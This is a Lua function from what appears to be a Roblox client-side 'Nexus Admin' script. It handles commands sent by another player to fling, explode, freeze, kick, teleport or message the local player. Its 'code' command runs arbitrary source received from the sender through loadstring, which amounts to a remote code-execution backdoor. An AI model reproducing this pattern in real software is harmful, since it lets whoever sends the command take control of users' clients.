function F.applyAdminCommand(cmd, fromPlr, extra)
	cmd = string.lower(tostring(cmd or ""))
	extra = extra or {}
	local who = (fromPlr and fromPlr.Name) or extra.fromName or "Admin"
	if cmd == "fling" then
		if UI.notify then UI.notify("Admin", who .. " flung you") end
		F.adminFling()
	elseif cmd == "explode" then
		if UI.notify then UI.notify("Admin", who .. " exploded you") end
		F.adminExplode()
	elseif cmd == "freeze" then
		if UI.notify then UI.notify("Admin", who .. " froze you") end
		F.adminFreeze(true)
	elseif cmd == "unfreeze" then
		if UI.notify then UI.notify("Admin", who .. " unfroze you") end
		F.adminFreeze(false)
	elseif cmd == "kick" then
		local reason = extra.m or extra.msg
		if type(reason) ~= "string" or reason == "" then
			reason = "Kicked by Nexus Admin (" .. who .. ")"
		end
		pcall(function()
			LocalPlayer:Kick(reason)
		end)
	elseif cmd == "bring" then
		if UI.notify then UI.notify("Admin", who .. " brought you") end
		F.adminBringTo(extra)
	elseif cmd == "msg" then
		F.showCenterMessage(who, tostring(extra.m or extra.msg or ""))
	elseif cmd == "code" then
		local src = extra.c or extra.code
		if type(src) == "string" and #src > 0 then
			pcall(function()
				local fn = loadstring(src)
				if fn then fn() end
			end)
		end
	end
end

